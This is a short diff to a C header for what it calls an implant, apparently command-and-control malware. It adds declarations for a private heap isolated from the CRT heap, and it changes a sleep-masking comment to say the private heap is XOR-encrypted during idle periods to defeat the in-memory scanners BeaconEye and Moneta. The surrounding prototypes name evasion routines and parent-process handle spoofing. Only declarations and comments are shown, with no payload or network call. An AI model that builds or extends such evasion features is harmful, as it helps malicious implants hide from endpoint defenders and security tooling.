@@ -30,7 +30,15 @@ BOOL RunAllEvasion(VOID);
 HANDLE GetSpoofParentHandle(VOID);
 
 // =============================================
-// Sleep Masking - XOR heap before sleep, restore after
+// Private Heap — isolates implant allocations from CRT heap
+// Call ImplantHeapInit() once at startup before any ImplantAlloc calls
+// =============================================
+BOOL  ImplantHeapInit(VOID);
+PVOID ImplantAlloc(SIZE_T size);
+VOID  ImplantFree(PVOID ptr);
+
+// =============================================
+// Sleep Masking - XOR private heap before sleep, restore after
 // Defeats in-memory scanners (BeaconEye, Moneta) during idle periods
 // =============================================
 VOID MaskedSleep(DWORD dwMs);
